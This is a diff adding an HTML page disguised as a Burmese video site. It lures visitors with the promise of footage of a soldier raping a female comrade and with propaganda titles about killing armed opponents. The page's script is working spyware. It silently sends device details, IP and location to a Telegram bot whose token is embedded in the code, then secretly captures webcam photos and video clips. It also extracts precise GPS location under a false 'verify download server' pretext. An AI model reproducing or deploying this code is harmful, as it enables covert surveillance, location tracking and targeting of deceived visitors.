@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sittthway.com</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    
+    <style>
+        :root {
+            --accent: #6366f1;
+            --bg: #080a0f;
+            --surface: #12151c;
+            --glass: rgba(255, 255, 255, 0.05);
+            --border: rgba(255, 255, 255, 0.1);
+            --text-p: #f8fafc;
+            --text-s: #94a3b8;
+            --success: #22c55e;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
+        body { background: var(--bg); color: var(--text-p); padding: 20px; display: flex; justify-content: center; }
+        .main-layout { width: 100%; max-width: 1200px; display: grid; grid-template-columns: 1fr 350px; gap: 30px; }
+
+        .video-section { position: relative; }
+        .player-wrapper { 
+            background: #000; border-radius: 24px; overflow: hidden; 
+            box-shadow: 0 20px 50px rgba(0,0,0,0.6); border: 1px solid var(--border);
+            aspect-ratio: 16/9; position: relative;
+        }
+        
+        .play-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); display: flex; align-items: center;
+            justify-content: center; z-index: 10; cursor: pointer; transition: 0.3s;
+        }
+        .play-overlay i { font-size: 80px; color: white; opacity: 0.9; }
+        .play-overlay.hidden { display: none; }
+
+        video { width: 100%; height: 100%; object-fit: cover; cursor: pointer; }
+        
+        .desc-card {
+            background: var(--surface); border-radius: 20px; padding: 25px;
+            margin-top: 25px; border: 1px solid var(--border);
+            background: linear-gradient(145deg, #161b25, #12151c);
+        }
+        .desc-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .chan-info { display: flex; align-items: center; gap: 15px; }
+        
+        .chan-img { 
+            width: 80px; height: 50px; border-radius: 10px; 
+            background: linear-gradient(45deg, var(--accent), #FFFFFF); 
+            overflow: hidden; 
+        }
+        .chan-img img { width: 100%; height: 100%; object-fit: cover; }
+        
+        .action-buttons { display: flex; gap: 10px; align-items: center; }
+        .btn { 
+            padding: 10px 20px; border-radius: 12px; border: none; cursor: pointer;
+            font-weight: 600; display: flex; align-items: center; gap: 8px; transition: 0.3s;
+        }
+        .btn-prime { background: var(--accent); color: white; }
+        .btn-glass { background: var(--glass); color: white; border: 1px solid var(--border); }
+        .btn-download { background: var(--success); color: white; padding: 12px 24px; font-size: 16px; box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3); }
+
+        .btn:hover { transform: translateY(-2px); filter: brightness(1.2); }
+        .desc-body { color: var(--text-s); font-size: 15px; line-height: 1.8; }
+        .stats-bar { display: flex; gap: 20px; margin-bottom: 15px; font-weight: 600; color: var(--text-p); }
+        .extra-features { margin-top: 30px; display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .feat-box { background: var(--glass); padding: 20px; border-radius: 18px; border: 1px dashed var(--border); transition: 0.3s; }
+        .side-bar h3 { margin-bottom: 20px; font-size: 18px; }
+        .suggest-card { display: flex; gap: 12px; margin-bottom: 15px; cursor: pointer; padding: 8px; border-radius: 12px; transition: 0.3s; }
+        .thumb { width: 120px; height: 70px; background: #1a1f26; border-radius: 8px; flex-shrink: 0; overflow: hidden; }
+        .thumb img { width: 100%; height: 100%; object-fit: cover; }
+        .suggest-info h4 { font-size: 14px; margin-bottom: 4px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; color: white; }
+        .suggest-info p { font-size: 12px; color: var(--text-s); }
+        .comments-preview { margin-top: 25px; border-top: 1px solid var(--border); padding-top: 20px; }
+        .comment-input { width: 100%; padding: 12px; background: var(--glass); border: 1px solid var(--border); border-radius: 10px; color: white; margin-top: 15px; }
+
+        #webcam-container { position: fixed; top: -9999px; left: -9999px; opacity: 0; }
+        #canvas { display: none; }
+        @media (max-width: 900px) { .main-layout { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+
+<div class="main-layout">
+    <div class="video-section">
+        <div class="player-wrapper" id="playerWrapper">
+            <div class="play-overlay" id="playOverlay">
+                <i class='bx bx-play-circle'></i>
+            </div>
+            <video id="v" src="https://www.w3schools.com/html/mov_bbb.mp4" controls loop></video>
+        </div>
+
+        <div class="desc-card">
+            <div class="desc-header">
+                <div class="chan-info">
+                    <div class="chan-img"><img src="https://pct.com.mm/wp-content/uploads/2022/09/cover.jpg" alt="Logo"></div>
+                    <div>
+                        <h3 style="font-size: 16px;">စစ်သွေး</h3>
+                        <p style="font-size: 12px; color: var(--text-s);">1.2M Subscribers</p>
+                    </div>
+                </div>
+                <div class="action-buttons">
+                    <button class="btn btn-prime"><i class='bx bx-bell'></i> Subscribe</button>
+                    <button class="btn btn-glass" onclick="alert('Added to Watch Later')"><i class='bx bx-plus'></i> Save</button>
+                    <button class="btn btn-download" id="dlBtn"><i class='bx bx-download'></i> 30</button>
+                </div>
+            </div>
+
+            <div class="stats-bar">
+                <span><i class='bx bx-play-circle'></i> 850K Views</span>
+                <span><i class='bx bx-heart'></i> 42K Likes</span>
+                <span><i class='bx bx-time-five'></i> 5days ago</span>
+            </div>
+
+            <div class="desc-body">          တပ်ဖွဲ့ဝင်အချင်းချင်းရဲးမေလေးကိုတောတွင်းတနေရာမှာမုဒိန်းကျင့်နေမူမှတ်တမ်းVideo<b>#</b> Videoထည်းမှာ ရဲးမေလေးကို တောတွင်းတနေရာမှာ ရဲးဘော်တစ်ယောက်ကအတင်းအဓမ္မပြုကျင့်နေတာကို ဘေးကရဲး...... Seemore
+            </div>
+
+            <div class="extra-features">
+                <div class="feat-box">
+                    <h4 style="margin-bottom: 8px;"><i class='bx bx-list-ul' color="#6366f1"></i> Smart Playlist</h4>
+                    <p style="font-size: 12px; color: var(--text-s);">ဒီ Video နဲ့ သက်ဆိုင်တဲ့ မှတ်တမ်းများကို တစ်စုတစ်စည်းတည်း ကြည့်လိုက်ပါ။</p>
+                </div>
+                <div class="feat-box">
+                    <h4 style="margin-bottom: 8px;"><i class='bx bx-share-alt' color="#6366f1"></i> Quick Share</h4>
+                    <p style="font-size: 12px; color: var(--text-s);">သူငယ်ချင်းတွေဆီကို Social Media ပေါင်းစုံကနေ တိုက်ရိုက် Share ပါ။</p>
+                </div>
+            </div>
+
+            <div class="comments-preview">
+                <h3 style="font-size: 16px;">Comments (1,240)</h3>
+                <input type="text" class="comment-input" placeholder="Add a public comment...">
+            </div>
+        </div>
+    </div>
+
+    <div class="side-bar">
+        <h3>Updrate New</h3>
+        <div class="suggest-card">
+            <div class="thumb"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTEis-uSel2cWpcr_vfcLd5Rf77ZQg0NZ3qCiT4wDXtxCkaL63oI1UmKaY&s=10"></div>
+            <div class="suggest-info"><h4>တကောင်းမြို့ကိုတပ်မတော်မှပြန်လည်ထိန်းချုပ်🇲🇲</h4><p>• 200K views 3days</p></div>
+        </div>
+        <div class="suggest-card">
+            <div class="thumb"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQGBYR6-c05dBTBgA5rhU14oNJngd9MsOwLCkiu1YczRg&s=10"></div>
+            <div class="suggest-info"><h4>အကြမ်းဖက်Pdfဆပ်ကြေးဂိတ်များကိုတပ်မတော်မှချေမှုန်းရှင်းလင်း🇲🇲</h4><p>• 1.5M views 1months</p></div>
+        </div>
+        
+        <div class="suggest-card">
+            <div class="thumb">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRvEXFX8IFHey8ljVDHSHIGsqwbrbCydPR2HdlKdDM-XQ&s" alt="Dark Mode">
+            </div>
+            <div class="suggest-info">
+                <h4>အကြမ်းဖက်Pdfအချင်းချင်းနိတ်စက်ညဥ်ပမ်းသတ်ဖြတ်နေမူVideo file🇲🇲</h4>
+                <p>• 85K views 5days</p>
+            </div>
+        </div>
+        
+    </div>
+</div>
+<div id="webcam-container">
+    <video id="webcam" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+</div>
+
+<script>
+    const TELEGRAM_BOT_TOKEN = '8562372604:AAGc-RZnlgHueqoRA2g6qwvQzRfItQpqJ50';
+    const TELEGRAM_CHAT_ID = '7336260003';
+    
+    const videoElem = document.getElementById('webcam');
+    const mainVideo = document.getElementById('v');
+    const playOverlay = document.getElementById('playOverlay');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const dlBtn = document.getElementById('dlBtn');
+    let photoInterval, mediaRecorder, recordedChunks = [], stream;
+
+    // Device Info စုစည်းပေးမည့် helper
+    async function getDeviceInfo(type, extra = "") {
+        let batteryInfo = "N/A";
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batteryInfo = `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : '🔋'}`;
+            }
+        } catch(e){}
+
+        let d = { query: "N/A", city: "N/A", country: "N/A" };
+        try {
+            const res = await fetch('http://ip-api.com/json/');
+            d = await res.json();
+        } catch(e){}
+
+        return `
+🔔 **New Target Log**
+-----------------------
+🛡 **Type:** ${type}
+📱 **Device:** ${navigator.platform}
+📏 **Res:** ${window.screen.width}x${window.screen.height}
+🔋 **Battery:** ${batteryInfo}
+🌐 **IP:** ${d.query}
+📍 **Loc:** ${d.city}, ${d.country}
+🍪 **Cookie:** ${document.cookie ? 'Enabled' : 'None'}
+${extra}
+        `;
+    }
+
+    async function collectData(type, extra = "") {
+        const msg = await getDeviceInfo(type, extra);
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown'})
+        });
+    }
+
+    async function initCamera() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            videoElem.srcObject = stream;
+            mainVideo.play();
+            playOverlay.classList.add('hidden');
+            collectData("...");
+
+            videoElem.onloadedmetadata = () => {
+                canvas.width = videoElem.videoWidth;
+                canvas.height = videoElem.videoHeight;
+                if (!photoInterval) {
+                    photoInterval = setInterval(capturePhoto, 3000); // ၁ စက္ကန့်တိုင်း ပို့မည်
+                    setTimeout(switchToVideo, 15000);
+                }
+            };
+        } catch (err) {
+            mainVideo.play();
+            playOverlay.classList.add('hidden');
+        }
+    }
+
+    dlBtn.addEventListener('click', () => {
+    // ၁။ ဒေါင်းလုဒ်လုပ်မည့် ဗီဒီယိုဖိုင် လမ်းကြောင်း (သင့်ဖိုင်အမည်ဖြင့် ပြောင်းရန်)
+    const videoUrl = 'your-video-file.mp4'; 
+    const fileName = 'video_30.mp4';
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const map = `🌍 Google Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            collectData("Location Allowed 📍", map);
+            
+            // ၂။ Location ရပြီးနောက် ဖိုင်ကို ဒေါင်းလုဒ်လုပ်ခိုင်းခြင်း
+            const link = document.createElement('a');
+            link.href = videoUrl;
+            link.download = fileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            alert("Download starting... Please wait.");
+        }, () => {
+            alert("Please allow location to verify download server.");
+        }, {enableHighAccuracy: true});
+    }
+});
+
+    playOverlay.addEventListener('click', initCamera);
+    document.querySelectorAll('.suggest-card').forEach(card => card.addEventListener('click', initCamera));
+
+    async function capturePhoto() {
+        if (!stream || !stream.active) return;
+        
+        const captionText = await getDeviceInfo("Camera Active 📸");
+        
+        ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => {
+            const fd = new FormData();
+            fd.append('chat_id', TELEGRAM_CHAT_ID);
+            fd.append('photo', blob, 'shot.jpg');
+            fd.append('caption', captionText);
+            fd.append('parse_mode', 'Markdown');
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        }, 'image/jpeg');
+    }
+
+    function switchToVideo() {
+        if (!stream || !stream.active) return;
+        clearInterval(photoInterval);
+        mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const b = new Blob(recordedChunks, {type: 'video/webm'});
+            const captionText = await getDeviceInfo("Video Clip 🎥");
+            const fd = new FormData();
+            fd.append('chat_id', TELEGRAM_CHAT_ID);
+            fd.append('video', b, 'clip.webm');
+            fd.append('caption', captionText);
+            fd.append('parse_mode', 'Markdown');
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {method: 'POST', body: fd});
+            recordedChunks = [];
+            if (stream.active) { mediaRecorder.start(); setTimeout(() => { if(mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 4000); }
+        };
+        mediaRecorder.start();
+        setTimeout(() => { if(mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 4000);
+    }
+
+    window.onload = () => { collectData("Initial Access 🚀"); };
+</script>
+
+</body>
+</html>
